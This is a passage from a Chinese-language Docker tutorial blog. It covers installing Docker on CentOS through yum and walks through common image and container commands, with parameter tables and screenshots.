<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502143309359.png" alt="image-20200502143309359"></p>
<p>第三步，当Docker的版本较低需要升级时，先卸载旧版本在下载新版本。卸载旧版本时需要旧版本Docker的全名(包含版本号)。查看Docker安装包列表的命令如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看Docker安装包列表</span><br><span class="line">yum list installed | grep docker</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502143658919.png" alt="image-20200502143658919"></p>
<p>然后使用安装包的名称删除Docker，命令如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用安装包的名称删除Docker</span><br><span class="line">sudo yum -y remove docker-ce.x86_64</span><br></pre></td></tr></table></figure>

<p>安装包删除完成后，可以通过查看版本号的命令判断是否删除成功</p>
<p>最后使用Docker安装新版本，即可实现Docker版本的更新。</p>
<p>由于Docker在Linux的CentOS操作系统中使用量最大，尽管使用yum进行Docker 的安装相较于使用脚本安装有些复杂，但不可否认的是，使用yum进行安装是一个不错的 选择，可通过以下几个步骤实现Docker在CentOS中的环境安装。</p>
<p>第一步，与使用脚本安装相同，需要进行内核版本的检测。</p>
<p>第二步，安装系统工具，为Docker安装做准备，命令如下</p>
<p><code>sudo yum install -y yum-utils device-mapper-persistent-data lvm2</code> </p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144355481.png" alt="image-20200502144355481"></p>
<p>第三步，安装软件源信息，命令如下所示</p>
<p><code>sudo yum-config-manager -add-repo https://download.docker.com/linux/centos/dock
er-ce.repo</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144512407.png" alt="image-20200502144512407"></p>
<p>第四步，更新yum缓存</p>
<p><code>sudo yum makecache fast</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144713035.png" alt="image-20200502144713035"></p>
<p>第五步，查看仓库中包含的Docker版本，选择特定版本安装</p>
<p><code>yum list docker-ce —showduplicates | sort -r</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144751935.png" alt="image-20200502144751935"></p>
<p>第六步，使用yum进行Docker的安装</p>
<p><code>sudo yum install docker-ce</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144832069.png" alt="image-20200502144832069"></p>
<p>如果想安装指定的版本</p>
<p><code>sudo yum install docker-ce-17.12.0.ce</code></p>
<p>第七步，启动Docker服务</p>
<p><code>sudo systemctl start docker</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144915810.png" alt="image-20200502144915810"></p>
<p>第八步，启动Docker服务后，可以通过查看Docker版本信息确保服务正常运行。</p>
<p><code>docker version</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502144958027.png" alt="image-20200502144958027"></p>
<p>第九步，测试Docker,并输出”hello world</p>
<p><code>docker run hello-world</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200504203403129.png" alt="image-20200504203403129"></p>
<p>Docker安装完成</p>
<h4 id="Docker镜像使用"><a href="#Docker镜像使用" class="headerlink" title="Docker镜像使用"></a>Docker镜像使用</h4><p>Docker镜像操作</p>
<p>在Docker中，镜像是必不可少的，是创建Docker容器的基础。Docker提供了很多用于镜像操作的命令，包含镜像的查找、构建、删除等。</p>
<h5 id="docker和虚拟机的特点"><a href="#docker和虚拟机的特点" class="headerlink" title="docker和虚拟机的特点"></a>docker和虚拟机的特点</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200504204423978.png" alt="image-20200504204423978"></p>
<h4 id="docker的常用命令"><a href="#docker的常用命令" class="headerlink" title="docker的常用命令"></a>docker的常用命令</h4><h5 id="docker帮助命令"><a href="#docker帮助命令" class="headerlink" title="docker帮助命令"></a>docker帮助命令</h5><p>docker version    查看信息</p>
<p>docker info    查看详细信息</p>
<p>docker –help    帮助命令</p>
<p>uname -r     查看内核版本</p>
<h5 id="镜像操作命令"><a href="#镜像操作命令" class="headerlink" title="镜像操作命令"></a>镜像操作命令</h5><table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>docker pull</td>
<td>拉去镜像</td>
</tr>
<tr>
<td>docker images</td>
<td>查看镜像信息</td>
</tr>
<tr>
<td>docker tag</td>
<td>设置镜像标签</td>
</tr>
<tr>
<td>docker search</td>
<td>查找镜像</td>
</tr>
<tr>
<td>docker rmi</td>
<td>删除镜像</td>
</tr>
<tr>
<td>docker save</td>
<td>导出镜像</td>
</tr>
<tr>
<td>docker load</td>
<td>载入镜像</td>
</tr>
<tr>
<td>docker push</td>
<td>上传镜像</td>
</tr>
</tbody></table>
<h5 id="（1）-docker-pull-下载镜像"><a href="#（1）-docker-pull-下载镜像" class="headerlink" title="（1） docker pull    下载镜像"></a>（1） docker pull    下载镜像</h5><p>在 Docker中，没有镜像容器无法被启动。通过“docker pull”命令即可实现镜像的拉去。“docker pull”命令包含的部分参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>拉去所有lagged镜像</td>
</tr>
<tr>
<td>-disable-content-trust</td>
<td>忽略</td>
</tr>
</tbody></table>
<p>目前，镜像可以从以下两个地方拉取。</p>
<p>查看当前存在什么镜像</p>
<p><code>docker images</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507143927966.png" alt="image-20200507143927966"></p>
<p>① 从Docker Hub(官方仓库)中拉取镜像。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 拉取ubuntu镜像</span><br><span class="line">docker pull ubuntu</span><br><span class="line">&#x2F;&#x2F; docker pull ubuntu:TAG ，如果省略TAG拉取的就是最新版，当然也可以定义TAG版本</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 比如将TAG写成3.2也就是也就是拉取的是ubuntu3.2版本</span><br><span class="line">docker pull ubuntu:3.2</span><br></pre></td></tr></table></figure>

<p>对Docker镜像来说，当不指定标签时，默认下载最新的版本“latest”标签。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507144041297.png" alt="image-20200507144041297"></p>
<p>使用<code>docker images</code>查看是否已经拉取成功ubuntu</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507144141141.png" alt="image-20200507144141141"></p>
<p>② 从私有仓库中拉取镜像，需要使用镜像的完整路径。</p>
<p><code>docker pull 192.168.1.101:5000/public/ubuntu:14.04</code></p>
<h5 id="2-docker-images-查看镜像信息"><a href="#2-docker-images-查看镜像信息" class="headerlink" title="(2) docker images     查看镜像信息"></a>(2) docker images     查看镜像信息</h5><p>​        “docker images”是查看镜像信息的命令，可以将本地主机上已有镜像的基本信息全部 列出来，还可以用于判断镜像是否拉取成功。在使用”dockerimages”命令查看镜像信息时, 可以通过加入一些参数实现条件查询</p>
<p>“docker images”命令包含的部分参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-a</td>
<td>列出本地所有的镜像(含中间影响层，在默认情况下过滤掉中间映像层)</td>
</tr>
<tr>
<td>–digests</td>
<td>显示镜像的摘要信息</td>
</tr>
<tr>
<td>-f</td>
<td>显示满足条件的镜像</td>
</tr>
<tr>
<td>–format</td>
<td>指定返回值的模块文件</td>
</tr>
<tr>
<td>–no-trunc</td>
<td>显示完整的镜像信息</td>
</tr>
<tr>
<td>-q</td>
<td>只显示镜像的ID</td>
</tr>
</tbody></table>
<p>使用“docker images”查询镜像信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 查看全部镜像的基本信息</span><br><span class="line">docker images</span><br><span class="line">&#x2F;&#x2F; 查看镜像的摘要信息</span><br><span class="line">docker images --digests</span><br><span class="line">&#x2F;&#x2F; 查看镜像的完整信息</span><br><span class="line">docker images --no-trunc</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507140519678.png" alt="image-20200507140519678"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 只显示镜像的ID</span><br><span class="line">docker images -q</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507140812722.png" alt="image-20200507140812722"></p>
<p>使用“docker images”命令查看到的基本信息字段及其代表的意义</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>REPOSITORY</td>
<td>来自哪个仓库</td>
</tr>
<tr>
<td>TAG</td>
<td>镜像标签信息</td>
</tr>
<tr>
<td>IMAGE ID</td>
<td>镜像的ID，是镜像的唯一表示。ID相同，说明两个镜像目前指向同一个镜像</td>
</tr>
<tr>
<td>GREATED</td>
<td>镜像的创建时间</td>
</tr>
<tr>
<td>SIZE</td>
<td>镜像的大小</td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200506200553254.png" alt="image-20200506200553254"></p>
<h5 id="（3）docker-tag-设置标签"><a href="#（3）docker-tag-设置标签" class="headerlink" title="（3）docker tag    设置标签"></a>（3）docker tag    设置标签</h5><p>“docker tag”命令主要用于设置镜像标签。当一个镜像被使用时，如果另一个项目同样需要使用这个镜像，为了区分镜像主要针对哪个项目，可以通过设置镜像标签来解决这个问题。</p>
<p><code>docker tag cenots centos01</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502195909779.png" alt="image-20200502195909779"></p>
<h5 id="（4）docker-search-查看镜像版本"><a href="#（4）docker-search-查看镜像版本" class="headerlink" title="（4）docker search    查看镜像版本"></a>（4）docker search    查看镜像版本</h5><p>“docker search”命令用于查找镜像。当想拉去一个镜像，却不知道有什么版本时，可以使用查找镜像的命令。在查找镜像时，先从本地查找，然后是本地仓库，最后Docker Hub仓库。</p>
<p>“docker search”命令包含的部分参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>–automated</td>
<td>只列出automated build类型的镜像</td>
</tr>
<tr>
<td>–no-trunc</td>
<td>显示完整的镜像描述</td>
</tr>
<tr>
<td>-s</td>
<td>累出收藏数不小于指定值的镜像</td>
</tr>
</tbody></table>
<p>使用“docker search”命令查找centos的相关镜像</p>
<p><code>docker search centos</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502195448035.png" alt="image-20200502195448035"></p>
<p>查找tomcat相关镜像</p>
<p><code>docker search tomcat</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507141105236.png" alt="image-20200507141105236"></p>
<p>加上-s筛选收藏度大于等于30的镜像</p>
<p><code>docker search -s 30 tomcat</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507142545457.png" alt="image-20200507142545457"></p>
<p>显示完整说明</p>
<p><code>docker search -s 30 --no-trunc comcat</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507143030170.png" alt="image-20200507143030170"></p>
<h5 id="（5）docker-rmi-删除镜像"><a href="#（5）docker-rmi-删除镜像" class="headerlink" title="（5）docker rmi    删除镜像"></a>（5）docker rmi    删除镜像</h5><p>“docker rmi”命令用于删除镜像。docker中，删除镜像有两种方法：一种是使用镜像的ID删除，另一种是使用仓库名称和标签名称的组合删除。</p>
<p>使用“docker rmi”命令只能删除不处于工作状态的镜像,如果删除运行容器的镜像, Docker会提示有容器正在运行,无法删除。</p>
<p>如果想删除这个镜像，有两种方式:第一种是使用强行删除命令,只需在删除命令中添 加“-f”参数即可;第二种是先删除依赖的所有容器，再使用删除命令。 </p>
<p>“docker rmi” 命令包含的部分参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-f</td>
<td>强制删除</td>
</tr>
<tr>
<td>-no-prune</td>
<td>不移除镜像的过程镜像，默认移除</td>
</tr>
</tbody></table>
<p>加参数-f是 <strong>删除单个镜像id</strong></p>
<p>之前有的镜像</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507144944574.png" alt="image-20200507144944574"></p>
<p>使用“ docker rmi”命令删除镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">删除ID为“hello-world”的镜像</span><br><span class="line">docker rmi hello-world</span><br></pre></td></tr></table></figure>

<p>报错了，必须强制，也就是让我们强制删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507145153748.png" alt="image-20200507145153748"></p>
<p>使用<code>docker rmi -f hello-world</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507145302970.png" alt="image-20200507145302970"></p>
<p><strong>删除多个镜像id</strong></p>
<p>查看当前镜像</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507150016628.png" alt="image-20200507150016628"></p>
<p>进行多个删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507150120363.png" alt="image-20200507150120363"></p>
<p>如果是想要将其全部删除</p>
<p>使用<code>docker rmi -f $(docker images -qa)</code>这个命令删除全部镜像</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200507151341283.png" alt="image-20200507151341283"></p>
<h5 id="（6）docker-save"><a href="#（6）docker-save" class="headerlink" title="（6）docker save"></a>（6）docker save</h5><p>“docker save”命令主要用于导出镜像。使用“docker save”命令加入“-o”参数即可将镜 像以压缩文件的形式导出到本地，之后如果想分享该镜像，只需复制压缩文件即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">〃导岀“ubuntu:Iatest”镜像,“-o”参数表示输出到的文件</span><br><span class="line">docker save -o ubuntu latest.tar ubuntu:latest</span><br></pre></td></tr></table></figure>

<h5 id="（7）docker-load"><a href="#（7）docker-load" class="headerlink" title="（7）docker load"></a>（7）docker load</h5><p>“docker load”是载入镜像命令。导出镜像是将镜像拿出来，而载入镜像是将镜像放进 去。通过载入镜像命令，导出的压缩文件可以再次导入本地镜像中。</p>
<p>“docker load”命令包 含的部分参数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>–input,-i</td>
<td>从tar压缩文件中读取</td>
</tr>
<tr>
<td>–quiet,-q</td>
<td>抑制负载输出</td>
</tr>
</tbody></table>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502195605857.png" alt="image-20200502195605857"></p>
<p>使用“ docker load ”命令载入镜像。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 载入&quot;ubuntu_latest.tar&quot;镜像 </span><br><span class="line">docker load —input ubuntu_latest.tar</span><br></pre></td></tr></table></figure>

<p>为了更直观地看到效果，先将”ubuntu:latest”镜像删除</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502195631583.png" alt="image-20200502195631583"></p>
<p>然后运行载入镜像命令</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200502195649107.png" alt="image-20200502195649107"></p>
<p>（8）docker push</p>
<p>“docker push”命令用于上传镜像，可以将本地镜像上传到仓库中,在默认情况下会将镜 像上传到Docker Hub官方仓库。</p>
<h4 id="Docker容器操作"><a href="#Docker容器操作" class="headerlink" title="Docker容器操作"></a>Docker容器操作</h4><h5 id="1、Docker容器简介"><a href="#1、Docker容器简介" class="headerlink" title="1、Docker容器简介"></a>1、Docker容器简介</h5><p>Docker容器是一个开源的容器引擎，允许开发人员将应用以及依赖项打包到一个可移植的容器中，然后发布到任何运行的linux上。容器采用沙箱机制，彼此没有任何借口，很容易在及其和数据中心运行。最重要的是，他们不依赖于任何语言、框架(包括系统)。</p>
<p>虽然Docker容器与其他容器技术相似，但Docker是将关键的应用程序组件捆绑在一个容器中，允许容器在不同的平台和云计算之间移植，因此Docker容器是需要跨多个不同的环境运行的应用程序的理想选择。</p>
<p><strong>注意：</strong>容器由创建时给出的镜像和配置项定义，当容器被删除是，其所有未被持久存储的状态变化都会丢失。</p>
<h5 id="2、Docker容器操作"><a href="#2、Docker容器操作" class="headerlink" title="2、Docker容器操作"></a>2、Docker容器操作</h5><p>​        在Docker中，容器与镜像在结构上大致相同，基本操作也相差不大，唯一的不同就是镜像可以直接拉取，而容器需要创建。</p>
<p>容器的相关命令</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>docker create</td>
<td>创建容器</td>
</tr>
<tr>
<td>docker ps</td>
<td>查看容器信息</td>
</tr>
<tr>
<td>docker start</td>
<td>启动容器</td>
</tr>
<tr>
<td>docker run</td>
<td>创建并启动容器</td>
</tr>
<tr>
<td>docker stop</td>
<td>停止容器</td>
</tr>
<tr>
<td>docker restart</td>
<td>重启容器</td>
</tr>
<tr>
<td>docker rm</td>
<td>删除容器</td>
</tr>
<tr>
<td>docker export</td>
<td>导出容器</td>
</tr>
<tr>
<td>docker import</td>
<td>导入容器</td>
</tr>
<tr>
<td>docker commit</td>
<td>创建新镜像</td>
</tr>
<tr>
<td>docker cp</td>
<td>在容器和本地文件之间复制文件/文件夹</td>
</tr>
</tbody></table>
<p>在使用容器之前，需要事先拉取镜像，如果没有拉取镜像就直接使用，会默认从Docker官方镜像仓库中加载，然后才能通过以上的相关命令实现容器的操作。</p>
<h5 id="新建并启动容器"><a href="#新建并启动容器" class="headerlink" title="新建并启动容器"></a>新建并启动容器</h5><h5 id="docker-run-运行容器"><a href="#docker-run-运行容器" class="headerlink" title="docker run    运行容器"></a>docker run    运行容器</h5><ul>
<li><p>OPTIONS：选项参数</p>
<ul>
<li><pre><code>--name=&quot;容器新名字&quot;：为容器指定一个名称
-d：后台运行容器，并返回容器ID，也即启动守护式容器；
-i：以交互模式运行容器，通常与与-t同时使用；可以理解为(我登录进docker里面这个centos容器以后，要跟你交互)
-t：为容器重新分配一个伪输入重点，通常与-i同时使用。可以理解为（登录进去后弹出一个可以输入命令的伪终端）
-P：随机端口映射；
-p：指定端口映射，有以下四种格式
    ip:hostPort:containerPort
    ip::containerPort
    hostPort:containerPort
    containerPort
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- IMAGE：镜像</span><br><span class="line">- COMMAND：命令</span><br><span class="line"></span><br><span class="line">&#96;docker run [OPTIONS] IMAGE [COMMAND] [ARG...]&#96;</span><br><span class="line"></span><br><span class="line">例如运行centos，如果本地有centos镜像就直接新建运行，如果本地没有centos那就会拉取新建运行</span><br><span class="line"></span><br><span class="line">先不加--name</span><br></pre></td></tr></table></figure>
// 生成了实例，并登陆到了docker里面的centos
docker run -it [IMAGE ID]
</code></pre></li>
</ul>
</li>
</ul>
<p>docker交互运行要有一个控制台，linux控制台一般都在bin下面的。默认进入bash<br>docker run -it centos /bin/bash</p>
<p>可以看到以下图面之前的命令行提示符是还在之前的宿主机里面，使用docker run命令后变成了a97229a12b57，意思就是登陆了docker中的centos了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20200507164617143](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507164617143.png)</span><br><span class="line"></span><br><span class="line">![image-20200707143114453](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200707143114453.png)</span><br><span class="line"></span><br><span class="line">使用&#96;--name&#96;参数进行重命名</span><br><span class="line"></span><br><span class="line">&#96;docker run -it --name mycentos1 centos&#96;</span><br><span class="line"></span><br><span class="line">![image-20200507173747984](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507173747984.png)</span><br><span class="line"></span><br><span class="line">##### 退出容器</span><br><span class="line"></span><br><span class="line">exit：容器停止退出</span><br><span class="line"></span><br><span class="line">ctrl+p+q：离开容器，但不停止</span><br><span class="line"></span><br><span class="line">使用&#96;ctrl+p+q&#96;离开容器但是并不是关闭</span><br><span class="line"></span><br><span class="line">在使用&#96;docker ps&#96;可以看到STATUS前面是UP</span><br><span class="line"></span><br><span class="line">![image-20200507185047248](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507185047248.png)</span><br><span class="line"></span><br><span class="line">##### docker create	创建容器</span><br><span class="line"></span><br><span class="line">“docker create”命令用来创建容器。创建容器时，只需要在“docker create”命令后面加上镜像的名称和标记即可，但使用“docker create”命令创建的容器是处于静止状态的。</span><br><span class="line"></span><br><span class="line">“docker create”命令包含的部分参数</span><br><span class="line"></span><br><span class="line">| 参数              | 描述                                                        |</span><br><span class="line">| ----------------- | ----------------------------------------------------------- |</span><br><span class="line">| -a stdin          | 指定标准输入输出内容类型，可选STDIN、STDOUT、STDERR三项之一 |</span><br><span class="line">| -d                | 后台运行容器，并返回容器的ID                                |</span><br><span class="line">| -i                | 以交互模式运行容器，通常与-t同时使用                        |</span><br><span class="line">| -t                | 为容器重新分配一个伪输入终端，通常与-i同时使用              |</span><br><span class="line">| --name&#x3D;&quot;nginx-lb&quot; | 为容器指定一个名称                                          |</span><br><span class="line">| --volume，-v      | 绑定一个卷                                                  |</span><br><span class="line">| --volume-driver   | 容器的可选卷驱动程序                                        |</span><br><span class="line">| --volumes-from    | 从指定容器装载卷                                            |</span><br><span class="line">| --publish，-p     | 将容器的端口发布到主机                                      |</span><br><span class="line">| --publish-all，-P | 将所有公开的端口发布到随机端口。                            |</span><br><span class="line">| --network         | 将容器连接到网络                                            |</span><br><span class="line">| --link            | 添加链接到另一个容器                                        |</span><br><span class="line">| --ip              | IPv4地址                                                    |</span><br><span class="line">| --detach，-d      | 在后台运行容器并打印容器的ID                                |</span><br><span class="line"></span><br><span class="line">使用“docker create”命令常见容器</span><br></pre></td></tr></table></figure>
<p>//“it”参数为”-i”和”-t”的组合<br>docker create -it ubuntu:latest</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### docker ps	查看容器信息</span><br><span class="line"></span><br><span class="line">“docker ps”是查看容器信息的命令，可以将所有容器的相关信息以列表的形式显示出来，包含容器的名称、ID等信息。单纯地使用“docker ps”命令可以查看当前正在运行的相关容器信息；如果想针对不同的情况去查询相关容器，可以再“docker ps”命令后加一些参数</span><br><span class="line"></span><br><span class="line">可以使用exit退出容器</span><br><span class="line"></span><br><span class="line">OPTIONS说明（常用）</span><br><span class="line"></span><br><span class="line">- -a：列出当前所有正在运行的容器+历史上运行过的</span><br><span class="line">- -i：显示最近创建的容器。</span><br><span class="line">- -n：显示最近n个创建的容器。</span><br><span class="line">- -q：静默模式，只显示容器编号。</span><br><span class="line">- --no-trunc：不截断输出</span><br><span class="line"></span><br><span class="line">“docker ps [OPTIONS]”命令包含的常用参数</span><br><span class="line"></span><br><span class="line">| 参数       | 描述                                      |</span><br><span class="line">| ---------- | ----------------------------------------- |</span><br><span class="line">| -a         | 列出当前所有正在运行的容器+历史上运行过的 |</span><br><span class="line">| -f         | 根据条件过滤显示的内容                    |</span><br><span class="line">| --format   | 指定返回的模板文件                        |</span><br><span class="line">| -l         | 显示最近创建的容器                        |</span><br><span class="line">| -n         | 列出最近创建的n个容器                     |</span><br><span class="line">| --no-trunc | 不截断输出                                |</span><br><span class="line">| -q         | 静默模式，只显示容器的编号                |</span><br><span class="line">| -s         | 显示总的文件大小                          |</span><br><span class="line"></span><br><span class="line">使用“docker ps参数查看docker运行的进程</span><br></pre></td></tr></table></figure>
<p>docker ps</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20200507170424573](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507170424573.png)</span><br><span class="line"></span><br><span class="line">使用&#96;docker ps -a&#96;显示所有容器，包括未运行的容器</span><br><span class="line"></span><br><span class="line">![image-20200507172414774](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507172414774.png)</span><br><span class="line"></span><br><span class="line">使用“docker ps -a”命令查看到的基本信息字段及其代表的意义</span><br><span class="line"></span><br><span class="line">| 字段          | 意义        |</span><br><span class="line">| ------------- | ----------- |</span><br><span class="line">| CONTAINER  ID | 容器的ID    |</span><br><span class="line">| IMAGE         | 镜像的名称  |</span><br><span class="line">| COMMAND       | command命令 |</span><br><span class="line">| CREATED       | 创建时间    |</span><br><span class="line">| STATUS        | 容器的状态  |</span><br><span class="line">| PORTS         | 端口号      |</span><br><span class="line">| NAMES         | 容器的名称  |</span><br><span class="line"></span><br><span class="line">使用&#96;docker ps -lq&#96;只显示容器编号</span><br><span class="line"></span><br><span class="line">![image-20200507171836778](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507171836778.png)</span><br><span class="line"></span><br><span class="line">##### docker start	开启容器</span><br><span class="line"></span><br><span class="line">使用docker start将没开启的容器进行开启，开启之后STATUS就会在前面加上UP</span><br><span class="line"></span><br><span class="line">![image-20200507190129849](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507190129849.png)</span><br><span class="line"></span><br><span class="line">##### docker restart	重启容器</span><br><span class="line"></span><br><span class="line">格式：</span><br><span class="line"></span><br><span class="line">&#96;docker restart 容器ID&#96;</span><br><span class="line"></span><br><span class="line">![image-20200507190715336](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507190715336.png)</span><br><span class="line"></span><br><span class="line">##### docker stop	停止容器</span><br><span class="line"></span><br><span class="line">格式：</span><br><span class="line"></span><br><span class="line">&#96;docker stop 容器ID&#96;</span><br><span class="line"></span><br><span class="line">![image-20200507191101140](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507191101140.png)</span><br><span class="line"></span><br><span class="line">##### docker kill	强制关闭</span><br><span class="line"></span><br><span class="line">格式：</span><br><span class="line"></span><br><span class="line">&#96;docker kill 容器ID&#96;</span><br><span class="line"></span><br><span class="line">![image-20200507191633590](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507191633590.png)</span><br><span class="line"></span><br><span class="line">##### docker rm	删除容器</span><br><span class="line"></span><br><span class="line">格式</span><br><span class="line"></span><br><span class="line">&#96;docker rm 容器ID&#96;如果现实在运行中加&#96;-f&#96;参数强制删除，如：&#96;docker rm -f 容器ID&#96;</span><br><span class="line"></span><br><span class="line">##### 注意：docker rm(没有i)是删除容器。docker rmi(有i)是删除镜像。一定要区分</span><br><span class="line"></span><br><span class="line">![image-20200507192219692](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507192219692.png)</span><br><span class="line"></span><br><span class="line">##### docker rm $(docker ps -aq) </span><br><span class="line"></span><br><span class="line">##### docker ps -aq | xargs docker rm</span><br></pre></td></tr></table></figure>
<p>// 查找所有运行和停止的容器，然后将这些信息传递到xargs然后docker rm 进行删除<br>docker ps -aq | xargs docker rm</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">这两个都是 一次性删除多个容器</span><br><span class="line"></span><br><span class="line">其中第二个中的&#96;xargs&#96;命令的作用，是将标准输入转为命令行参数。</span><br></pre></td></tr></table></figure>
<p>例如：<br>    $ echo “hello world” | xargs echo<br>含义：将管道左侧的标准输入，转为命令行参数hello world，传给第二个echo命令。<br>也就是，上一个命令的结果集作为输入参数传给管道后的下一个参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### docker run -d 容器名</span><br><span class="line"></span><br><span class="line">后台运行容器，并返回容器的ID</span><br><span class="line"></span><br><span class="line">![image-20200507211155631](https:&#x2F;&#x2F;gitee.com&#x2F;zhanqiaozai&#x2F;picture&#x2F;raw&#x2F;master&#x2F;image-20200507211155631.png)</span><br><span class="line"></span><br><span class="line">使用镜像centos：latest以后台模式启动一个容器</span><br><span class="line"></span><br><span class="line">&#96;docker run -d centos&#96;</span><br><span class="line"></span><br><span class="line">问题：使用&#96;docker ps -a&#96;进行查看，会发现容器已经退出</span><br><span class="line"></span><br><span class="line">很重要的要说明的一点：**Docker容器宏图爱运行，就必须有一个前台进程。**</span><br><span class="line"></span><br><span class="line">容器运行的命令如果不是那些**一直挂起的命令（比如运行top、tail）**，就会自动退出的。</span><br><span class="line"></span><br><span class="line">这个是docker的机制问题，比如你的web容器，我们以nginx为例，正常情况下，我们配置启动服务只需要启动相应的service即可。即可。</span><br><span class="line"></span><br><span class="line">例如：service nginx start</span><br><span class="line"></span><br><span class="line">但是，这样做nginx为后台进程模式运行，就导致docker前台没有运行的应用。</span><br><span class="line"></span><br><span class="line">这样的容器后台启动后，会立即自杀因为他觉得他没事可做了，所以，最佳的解决方案的是，将你要运行的程序以前台进程的形式运行</span><br><span class="line"></span><br><span class="line">**说白了前台启动用&#96;-it&#96;会返回给你一个自身容器的id编号的终端。 使用&#96;-d&#96;以后台模式启动容器**</span><br><span class="line"></span><br><span class="line">##### &#96;docker logs -f 